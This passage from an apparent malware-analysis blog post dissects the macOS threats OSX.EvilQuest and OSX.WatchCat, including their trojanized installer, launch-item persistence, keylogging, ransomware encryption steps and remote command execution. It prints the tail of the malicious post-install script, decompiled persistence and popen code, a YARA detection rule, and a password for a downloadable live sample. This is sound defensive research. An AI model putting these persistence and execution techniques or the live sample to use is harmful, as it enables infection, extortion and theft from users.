</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>chmod +x /Library/mixednkey/toolroomd
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>/Library/mixednkey/toolroomd &amp;</span></span></code></pre></div>
<p>This post install script (which is executed during the package installation) will first create a <code>/Library/mixednkey</code> directory. Then, it moves the <code>patch</code> binary into this directory (renaming it <code>toolroomd</code>), sets it to be executable &hellip;and then launches it.</p>
<p>As the installer requests root privileges during the install, this script (and thus the <code>toolroomd</code> binary) will also run with root privileges:</p>
<img src="../images/blog/blog_0x59/install.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<br>
<div class="note">
As the "Mixed In Key 8" binary is (still) validly signed by the Mixed In Key developers, it is likely pristine and unmodified
<p>&hellip;the malicious components of the package, are thus the post install script and the patch binary.</p>
</div>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Item</span>
</p>
<p>Depending on its privilege level, <code>OSX.EvilQuest</code> persists either as a user launch agent, or a launch daemon (and a launch agent). The code responsible for this logic is found within a function named <code>ei_persistence_main</code>.</p>
<p>After invoking various anti-analysis logic (e.g. debugger check), the function then invokes a helper function, <code>persist_executable</code> to install the malware. If the malware is running with non-root privileges it copy itself to <code>~/Library/AppQuest/com.apple.questd</code>. However, if running as root, it will also copy itself to <code>/Library/AppQuest/com.apple.questd</code>.</p>
<p>Once the malware has copied itself, it persists via a launch item. The code that performs this persistence is found in the <code>install_daemon</code> function (invoked by <code>ei_persistence_main</code>). If running as non-root, it persists as a launch agent: <code>~/Library/LaunchAgents/com.apple.questd.plist</code>. If the malware is running with root privileges it will invoke the <code>install_daemon</code> function again, but this time specifying that a launch daemon should be created.</p>
<p>After the malware has ensured it is persisted (twice, if running as root!), it invokes the <code>ei_selfretain_main</code> function to start the launch item(s). This function invokes the aptly named <code>run_daemon</code> which in turn invokes macOS&rsquo;s <code>osascript</code> binary to launch the items via an AppleScript command:</p>
<img src="../images/blog/blog_0x5F/eqPersist.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest launch item persistence</center>

<br>
<div class="note">
The template for the property list for these launch item(s) is stored as an encrypted string within the malware.
</div>
<p>As the <code>RunAtLoad</code> is set to true in the malware&rsquo;s launch item plist (<code>com.apple.questd.plist</code>), macOS will automatically restart the malware on subsequent reboots.</p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> File Exfiltration, Remote Tasking, Ransomware, Viral Infection ...and more!
</span>
</p>
<p>One of the first actions taking by <code>OSX.EvilQuest</code>, is to scan an infected system for various files that match a list of embedded regular expressions. From these regexes, we can ascertain that the malware has a propensity for certificates and crypto-currency keys &amp; wallets:</p>
<img src="../images/blog/blog_0x5F/eqFileExfil.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest&#39;s file exfiltration</center>

<p>Any file on the infected system that matches any of these regexes will be exfiltrated to the attacker (including, as shown above, a test file, <code>key.png</code>).</p>
<p>The malware also supports remote tasking, including the following:</p>
<ul>
<li>
<p>Task <code>0x1</code>: <code>react_exec</code>
<br>
<br>
The <code>react_exec</code> command appears to execute a payload received from the server. Interestingly it attempts to first execute the payload directly from memory! Specifically it invokes a function named <code>ei_run_memory_hrd</code> which invokes the Apple <code>NSCreateObjectFileImageFromMemory</code>, <code>NSLinkModule</code>, <code>NSLookupSymbolInModule</code>, and <code>NSAddressOfSymbol</code> APIs to load and link the in-memory payload.
<br>
<br>
At a previous BlackHat talk (<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf">&ldquo;Writing Bad @$$ Malware for OS X&rdquo;</a>), I discussed this technique (an noted Apple used to host sample code to implement such in-memory execution):
<br>
<br>
<img src="../images/blog/blog_0x51/presentation.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<br>
If the in-memory execution fails, the malware writes out the payload to a file named <code>.xookc</code>, sets it to be executable (via <code>chmod</code>), then executes via a call to <code>system</code>.</p>
</li>
<li>
<p>Task <code>0x2</code>: <code>react_save</code>
<br>
<br>
The <code>react_save</code> decodes data received from the server and saves it to a file. It appears the file name is specified by the server as well. In some cases the file will be set to executable via a call to <code>chmod</code>.</p>
</li>
<li>
<p>Task <code>0x4</code>: <code>react_start</code>
<br>
<br>
This method is a nop, and does nothing:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">react_start</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}</span></span></code></pre></div></p>
</li>
<li>
<p>Task <code>0x8</code>: <code>react_keys</code>
<br>
<br>
The <code>react_keys</code> command starts a keylogger. Specifically it instructs the malware to spawn a background thread to execute a function named <code>eilf_rglk_watch_routine</code>. This function creates an event tap (via the <code>CGEventTapCreate</code> API), add it to the current runloop, then invokes the <code>CGEventTapEnable</code> to activate the event tap.
<br>
Once the tap is activated, keypresses (e.g. by the user) will be delivered to the <code>process_event</code> function, which then converts the the raw keypresses &ldquo;readable&rdquo; key codes (via the <code>kconvert</code> function). Somewhat interestingly, the malware then passes the converted key code to the <code>printf</code> function &hellip;to print them out? (You&rsquo;d have thunk it would write them to a file &hellip;). Perhaps this part of code is not quite done (yet)!</p>
</li>
<li>
<p>Task <code>0x10</code>: <code>react_ping</code>
<br>
<br>
The <code>react_ping</code> command simply compares a value from the server with the (now decrypted) string <code>&quot;Hi there&quot;</code>. A match causes this command to return &ldquo;success&rdquo;, which likely just causes the malware to respond to the server for (more) tasking.</p>
</li>
<li>
<p>Task <code>0x20</code>: <code>react_host</code>
<br>
<br>
This method is a nop, and does nothing:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">react_host</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}</span></span></code></pre></div></p>
</li>
<li>
<p>Task <code>0x40</code>: <code>react_scmd</code>
<br>
<br>
The <code>react_scmd</code> command will execute a command from the server via the <code>popen</code> API:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EDD                 mov     rdi, [rbp<span style="color:#f92672">+</span>var_18] ; <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EE1                 lea     rsi, aR         ; <span style="color:#e6db74">&#34;r&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EE8                 mov     [rbp<span style="color:#f92672">+</span>var_70], rax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EEC                 call    _popen</span></span></code></pre></div>
<br>
The response (output) of the command is read, and transmitted about to the server via the <code>eicc_serialize_request</code> and <code>http_request</code> functions.</p>
</li>
</ul>
<p>The most readily observable side-affect of an <code>OSX.EvilQuest</code> infection is its file encryption (ransomware) activities.</p>
<p>After the malware has invoked a method named <code>_s_is_high_time</code> and waited on several timers to expire, it begins encrypting the (unfortunate) user&rsquo;s files, by invoking a function named <code>carve_target</code>.</p>
<p>The <code>carve_target</code> first begins the key generation process via a call to the <code>random</code> API, and functions named <code>eip_seeds</code> and <code>eip_key</code>. It then generates a list of files to encrypt, by invoking the <code>get_targets</code> function, passing in the <code>is_file_target</code> as a filter function. This filter function filters out all files, except those that match certain file extensions. The encrypted list of extensions is hard-coded in the malware.</p>
<p>Armed with a list of target files (that match the above extensions), the malware completes the key generation process (via a call to <code>random_key</code>, which in turn calls <code>srandom</code> and <code>random</code>), before calling a function named <code>carve_target</code> on each file.</p>
<p>The <code>carve_target</code> function is invoked with the path of the file to encrypt, the result of the call to <code>random_key</code>, as well as values from returned by the calls to <code>eip_seeds</code> and <code>eip_key</code>.</p>
<p>It takes the following actions:</p>
<ol>
<li>Makes sure the file is accessible via a call to <code>stat</code></li>
<li>Creates a temporary file name, via a call to a function named <code>make_temp_name</code></li>
<li>Opens the target file for reading</li>
<li>Checks if the target file is already encrypted via a call to a function named <code>is_carved</code> (which checks for the presence of <code>BEBABEDD</code> at the end of the file).</li>
<li>Open the temporary file for writing</li>
<li>Read(s) 0x4000 byte chunks from the target file</li>
<li>Invokes a function named <code>tpcrypt</code> to encrypt the (0x4000) bytes</li>
<li>Write out the encrypted bytes to the temporary file</li>
<li>Repeats steps 6-8 until all bytes have been read and encrypted from the target file</li>
<li>Invokes a function named <code>eip_encrypt</code> to encrypt (certain?) keying information which is then appended to the temporary file</li>
<li>Writes <code>0DDBEBABE</code> to end of the temporary file (as noted by <a href="https://twitter.com/dineshdina04/status/1277672052686614528">Dinesh Devadoss</a>)</li>
<li>Deletes the target file</li>
<li>Renames the temporary file to the target file</li>
</ol>
<img src="../images/blog/blog_0x5F/eqRansom.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest&#39;s file ransom logic</center>

<p>Once all the files in the list of target files have been encrypted, the malware writes out the following to a file named <code>READ_ME_NOW.txt</code>:</p>
<img src="../images/blog/blog_0x59/readMe.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest&#39;s ransom note</center>

<p>To make sure the user reads this file, it displays the following modal prompt, and reads it aloud via macOS built-in <code>say</code> command:</p>
<img src="../images/blog/blog_0x59/instructions.png"  width="66%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest&#39;s ransom alert</center>

<br>
<div class="note">
The encryption logic was broken by researchers at SentinelOne:
<br><br>
<center>
  "<a class="inlineLink" href="https://labs.sentinelone.com/breaking-evilquest-reversing-a-custom-macos-ransomware-file-encryption-routine/">Breaking EvilQuest | Reversing A Custom macOS Ransomware File Encryption Routine</a>"
</center>
<p>Moreover, the ransomware logic has been removed in subsequent versions of the malware.</p>
</div>
<p>The most unique feature of <code>OSX.EvilQuest</code> is its capabilities to (locally) virally propagate. In short, the malware generates a list of executables on the system, the invokes a method named <code>append_ai</code> to inject itself into the binary:</p>
<img src="../images/blog/blog_0x5F/eqViralOverview.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest&#39;s viral infection logic</center>

<p>The following image illustrates the details of the viral infection:</p>
<img src="../images/blog/blog_0x5F/eqViral.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest&#39;s viral infection logic</center>

<br>
<div class="note">
<p>To ensure the infected binary acts &ldquo;normal&rdquo; (i.e. runs its original code so that nothing appears amiss), the viral code writes the programs original bytes out to a new file named: .&lt;orginalfilename&gt;1. This file is then set executable (via chmod) and executed (via execl).</p>
</div>
<p>By injecting itself into the start of the (other) binaries on the system, the malware ensures that it is rather difficult to remove!</p>
<h3 id="-osxwatchcat">üëæ <code>OSX.WatchCat</code></h3>
<div class="note">
<p>WatchCat appears to be a Lazarus APT group creation, that builds off previous backdoors &hellip;while adding new capabilities.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/WatchCat.zip"><code>OSX.WatchCat</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>As noted by the macOS security researcher <a href="https://twitter.com/sdotknight/">Scott Knight</a>, information about <code>OSX.WatchCat</code> was made public via the addition of an XProtect signature (version 2127):</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">XProtect 2127 adds two new rules to detect &quot;watchcat&quot;. VT engines label it as NukeSpeed. Could be Lazarus related.<br> 3bb96bfaf492782b38985f4bd6b7e7f9dc22c1332b42bb74b16041298fd31f93</p>&mdash; Scott Knight (@sdotknight) <a href="https://twitter.com/sdotknight/status/1286667418283184128?ref_src=twsrc%5Etfw">July 24, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>Scanning the malicious binary via <a href="https://digitasecurity.com/uxprotect/">UXProtect</a>, shows a match on <code>XProtect_MACOS_580a1bc</code>:</p>
<img src="../images/blog/blog_0x5F/wcYara.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ cd /Library/Apple/System/Library/CoreServices/
$ cat XProtect.bundle/Contents/Resources/XProtect.yara

rule XProtect_MACOS_580a1bc
{
    meta:
      description = "MACOS.580a1bc"
    strings:
      $s1 = { 73 77 5F 76 65 72 73 20 2D 70 72 6F 64 75 63 74 4E 61 6D 65 }
      $s2 = { 73 77 5F 76 65 72 73 20 2D 70 72 6F 64 75 63 74 56 65 72 73 69 6F 6E }
      $s3 = { 73 77 5F 76 65 72 73 20 2D 62 75 69 6C 64 56 65 72 73 69 6F 6E }
      $s4 = { 4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 ... }
      $s5 = { 63 6F 6D 2E 61 70 70 6C 65 2E 77 61 74 63 68 63 61 74 2E 70 6C 69 73 74 }
    condition:
      Macho and filesize < 500KB and all of them
}

</pre>
</div>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/">&ldquo;Four Distinct Families of Lazarus Malware Target Apple‚Äôs macOS Platform&rdquo;</a></li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown</span></p>
<p>Unfortunately the XProtect signature and a binary sample is all the (public) information we have about <code>OSX.WatchCat</code> &hellip;meaning its infection vector remains unknown. However, Lazarus APT group (the likely authors of this malware) are rather fond of packaging up their backdoors in trojanized applications:</p>
<img src="../images/blog/blog_0x49/rsa.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;thus, it&rsquo;s possible that <code>OSX.WatchCat</code> is distributed in a similar manner.</p>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Daemon</span>
</p>
<p>Taking a peak at the <code>OSX.WatchCat</code> binary, we find an embedded launch daemon property list:</p>
<img src="../images/blog/blog_0x5F/wcPersist.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>This (embedded) plist is referenced from a function named <code>InsertToLaunchDaemons</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_InsertToLaunchDaemons</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    plist <span style="color:#f92672">=</span> malloc(strlen(arg0) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x400</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    sprintf_chk(plist, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#e6db74">&#34;&lt;?xml version=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">1.0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> encoding=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">UTF-8</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">?&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!DOCTYPE plist PUBLIC </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-//Apple//DTD PLIST 1.0//EN</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">http://www.apple.com/DTDs/PropertyList-1.0.dtd</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;plist version=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">1.0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;dict&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;key&gt;Label&lt;/key&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;string&gt;com.apple.watchcat&lt;/string&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;key&gt;ProgramArguments&lt;/key&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;arr‚Ä¶&#34;</span>, arg0, arg1);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    sprintf_chk(path, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x104</span>, <span style="color:#e6db74">&#34;/Library/LaunchDaemons/%s&#34;</span>, <span style="color:#e6db74">&#34;com.apple.watchcat.plist&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    file <span style="color:#f92672">=</span> fopen(path, <span style="color:#e6db74">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      fwrite(plist, strlen(plist), <span style="color:#ae81ff">0x1</span>, rbx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      fclose(file);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      chmod(path, <span style="color:#ae81ff">444</span>o);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>}</span></span></code></pre></div>
<p>The above code first formats the property lists (i.e. adds the full path the malware&rsquo;s binary image), and builds a path to the launch daemon (<code>/Library/LaunchDaemons/com.apple.watchcat.plist</code>). It then writes out the (now configured) plist.</p>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code> the malware will be automatically (re)started each time the system is rebooted.</p>
<p>&hellip;however the first time (i.e. prior to reboot), the malware manually starts the launch daemon via the <code>SinLaunchCTL</code> function. This function simply invokes <code>launchctl load</code> on the launch daemon plist (<code>com.apple.watchcat.plist</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">SinLaunchCTL</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    sprintf_chk(path, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x104</span>, <span style="color:#e6db74">&#34;/Library/LaunchDaemons/%s&#34;</span>, <span style="color:#e6db74">&#34;com.apple.watchcat.plist&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    sprintf_chk(command, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x200</span>, <span style="color:#e6db74">&#34;launchctl load %s &gt; /dev/null 2&gt;&amp;1 &amp;&#34;</span>, path);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    rax <span style="color:#f92672">=</span> popen(command, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>}</span></span></code></pre></div>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Backdoor, plus "webshell"
</span>
</p>
<p>Mac malware analyst <a href="https://twitter.com/philofishal">Phil Stokes</a> notes in a <a href="https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/">recent writeup</a>:</p>
<blockquote>
"...there are some overlaps with the earlier [Lazarus Group] backdoor samples ...there is also much more to this malware that has not been seen in the other samples, including use of a WebShell.
</blockquote>
<p>Before taking a look at the webshell, let&rsquo;s discuss <code>OSX.WatchCat</code>&rsquo;s download and execute functionality.</p>
<p>To execute external commands and processes, the malware invokes the <code>popen</code> system API.  By looking at cross-references (x-refs) to this API, we can find the code responsible for executing commands from the server:</p>
<img src="../images/blog/blog_0x5F/wcExec.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>The malware&rsquo;s <code>MsgCmd</code> function, invokes <code>popen</code> on a passed in argument:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">MsgCmd</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    buffer <span style="color:#f92672">=</span> malloc(SAR(<span style="color:#ae81ff">0x1000000000</span> <span style="color:#f92672">+</span> (strlen(arg0) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x20</span>), <span style="color:#ae81ff">0x20</span>));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    __sprintf_chk(buffer, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#e6db74">&#34;%s 2&gt;&amp;1&#34;</span>, arg0);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    popen(buffer, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>}</span></span></code></pre></div>
<p>Working backwards, we see that the <code>MsgCmd</code> function is invoked from the <code>CmdProc</code> function. The <code>CmdProc</code> first invokes the <code>SendMsgOnlyType</code> function (to send an message to a remote command &amp; control server via the <code>curl</code> APIs). Then parses the response and acts upon it:</p>
<img src="../images/blog/blog_0x5F/wcSwitch.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>As (just) noted, the <code>MsgCmd</code> will executed the specified command.</p>
<p>Other commands appear to provide a remote attacker the ability to:</p>
<ul>
<li>download files</li>
<li>upload files</li>
<li>kill a process (<code>MsgPK</code>)</li>
<li>delete a file (<code>MsgSdel</code>)</li>
<li>&hellip;and more!</li>
</ul>
<p>As Phil noted, this is similar to the capabilities afforded by other Lazarus Group backdoors (such as <a href="https://objective-see.com/blog/blog_0x53.html#osx-yort">OSX.Yort</a>). Also though he noted the addition of the &ldquo;use of a WebShell.&rdquo;</p>
<p>The &ldquo;webshell&rdquo; logic is found in the <code>Auth_WebShell</code> function (which is invoked in a loop by the malware&rsquo;s <code>Start</code> function). It appears to be a simple check in, with a value of <code>259D7B1TE1002A65</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Auth_WebShell</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> rand();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    _g_nBoardID <span style="color:#f92672">=</span> rax <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>((<span style="color:#ae81ff">0xffffffffe90452d5</span> <span style="color:#f92672">*</span> rax <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x2d</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2328</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3e8</span>;
